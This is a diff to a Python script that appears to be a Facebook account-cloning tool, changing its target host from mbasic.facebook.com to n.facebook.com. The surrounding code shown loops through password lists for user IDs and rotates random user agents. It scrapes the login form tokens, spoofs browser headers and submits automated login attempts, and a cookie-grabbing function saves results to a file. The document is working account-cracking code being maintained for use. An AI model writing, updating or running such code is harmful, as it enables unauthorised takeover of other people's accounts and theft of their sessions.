@@ -912,7 +912,7 @@ def gxdsclone():
 # GET COOKIES
 def xcokis():
     gxdslogo()
-    url = "https://mbasic.facebook.com"
+    url = "https://n.facebook.com"
     xurl = url + "/login.php"
     ua = "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
     print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
@@ -1052,7 +1052,7 @@ def gxds_files(uid, pxss):
     try:
         for ps in pxss:
             qwerty = random.choice(gxdsUArndm)
-            gxdsfbs = session.get("https://mbasic.facebook.com").text
+            gxdsfbs = session.get("https://n.facebook.com").text
             dxta = {
                 "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                 "jazoest": re.search(
@@ -1067,14 +1067,14 @@ def gxds_files(uid, pxss):
                 "login": "Log In",
             }
             headxr = {
-                "authority": "https://mbasic.facebook.com",
+                "authority": "https://n.facebook.com",
                 "method": "POST",
                 "scheme": "https",
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                 "accept-encoding": "gzip, deflate, br",
                 "accept-language": "en-US,en;q=1",
                 "cache-control": "no-cache, no-store, must-revalidate",
-                "referer": "https://mbasic.facebook.com/",
+                "referer": "https://n.facebook.com/",
                 "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": "Windows",
@@ -1089,7 +1089,7 @@ def gxds_files(uid, pxss):
                 "user-agent": qwerty,
             }
             session.post(
-                url="https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
+                url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                 data=dxta,
                 headers=headxr,
             ).text
